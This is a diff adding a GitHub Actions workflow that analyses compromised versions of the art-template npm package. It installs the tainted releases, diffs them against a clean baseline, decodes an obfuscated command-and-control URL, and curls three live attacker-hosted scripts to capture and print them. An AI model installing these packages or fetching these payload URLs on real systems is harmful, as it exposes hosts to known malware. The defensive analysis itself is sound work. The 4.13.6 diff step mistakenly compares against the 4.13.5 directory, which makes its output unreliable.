@@ -1,0 +1,111 @@
+name: Analyze art-template compromised versions (issue 665)
+
+on:
+  workflow_dispatch:
+
+permissions: read-all
+
+jobs:
+  analyze-art-template:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Harden the runner (Audit all outbound calls)
+        uses: step-security/harden-runner@v2
+        with:
+          egress-policy: audit
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: "20"
+
+      # ── Baseline: last known-clean version ──────────────────────────────────
+      - name: Install art-template 4.13.2 (baseline)
+        run: npm install art-template@4.13.2 --prefix ./baseline
+
+      - name: Capture baseline file hashes
+        run: |
+          find ./baseline/node_modules/art-template -name "*.js" | sort | xargs sha256sum > baseline-hashes.txt
+          cat baseline-hashes.txt
+
+      # ── v4.13.3 – obfuscated String.fromCharCode injection ──────────────────
+      - name: Install art-template 4.13.3
+        run: npm install art-template@4.13.3 --prefix ./v4133
+
+      - name: Show injected code in 4.13.3
+        run: |
+          echo "=== files changed vs baseline ==="
+          diff <(awk '{print $2}' baseline-hashes.txt | sed 's|./baseline/|./v4133/|') \
+               <(find ./v4133/node_modules/art-template -name "*.js" | sort) || true
+          echo "=== String.fromCharCode injection ==="
+          grep -rn "fromCharCode\|scriptMagician\|youzzjizz" ./v4133/node_modules/art-template || echo "(not found)"
+          echo "=== decode the obfuscated C2 URL ==="
+          node -e "console.log(String.fromCharCode.apply(null,[104,116,116,112,115,58,47,47,103,105,116,46,121,111,117,122,122,106,105,122,122,46,99,111,109,47,103,105,116,46,106,115]))"
+
+      - name: Diff 4.13.3 vs baseline
+        continue-on-error: true
+        run: |
+          for f in $(find ./v4133/node_modules/art-template -name "*.js" | sed 's|./v4133/node_modules/art-template/||'); do
+            base=./baseline/node_modules/art-template/$f
+            comp=./v4133/node_modules/art-template/$f
+            if [ -f "$base" ] && [ -f "$comp" ]; then
+              diff -u "$base" "$comp" && true || echo "--- DIFF: $f ---"
+            fi
+          done
+
+      # ── v4.13.5 – direct jiathis injection ──────────────────────────────────
+      - name: Install art-template 4.13.5
+        run: npm install art-template@4.13.5 --prefix ./v4135
+
+      - name: Show injected code in 4.13.5
+        run: |
+          echo "=== loadScript / jiathis markers ==="
+          grep -rn "loadScript\|jiathis\|v3\.jiathis\.com" ./v4135/node_modules/art-template || echo "(not found)"
+
+      - name: Diff 4.13.5 vs baseline
+        continue-on-error: true
+        run: |
+          for f in $(find ./v4135/node_modules/art-template -name "*.js" | sed 's|./v4135/node_modules/art-template/||'); do
+            base=./baseline/node_modules/art-template/$f
+            comp=./v4135/node_modules/art-template/$f
+            if [ -f "$base" ] && [ -f "$comp" ]; then
+              diff -u "$base" "$comp" && true || echo "--- DIFF: $f ---"
+            fi
+          done
+
+      # ── v4.13.6 – direct art.js injection ───────────────────────────────────
+      - name: Install art-template 4.13.6
+        run: npm install art-template@4.13.6 --prefix ./v4136
+
+      - name: Show injected code in 4.13.6
+        run: |
+          echo "=== loadScript / art.js markers ==="
+          grep -rn "loadScript\|jiathis\|art\.js" ./v4136/node_modules/art-template || echo "(not found)"
+
+      - name: Diff 4.13.6 vs baseline
+        continue-on-error: true
+        run: |
+          for f in $(find ./v4136/node_modules/art-template -name "*.js" | sed 's|./v4136/node_modules/art-template/||'); do
+            base=./baseline/node_modules/art-template/$f
+            comp=./v4135/node_modules/art-template/$f
+            if [ -f "$base" ] && [ -f "$comp" ]; then
+              diff -u "$base" "$comp" && true || echo "--- DIFF: $f ---"
+            fi
+          done
+
+      # ── Probe C2 domains so they appear in harden-runner audit log ──────────
+      - name: Probe C2 domains (audit capture)
+        continue-on-error: true
+        run: |
+          curl -fsSL --max-time 10 "https://git.youzzjizz.com/git.js" -o youzzjizz-git.js || true
+          curl -fsSL --max-time 10 "https://v3.jiathis.com/code/jia.js?uid=artemplate" -o jiathis-jia.js || true
+          curl -fsSL --max-time 10 "https://v3.jiathis.com/code/art.js" -o jiathis-art.js || true
+          echo "=== youzzjizz-git.js ==="
+          cat youzzjizz-git.js || true
+          echo "=== jiathis-jia.js ==="
+          cat jiathis-jia.js || true
+          echo "=== jiathis-art.js ==="
+          cat jiathis-art.js || true
+
+      - run: sleep 1m
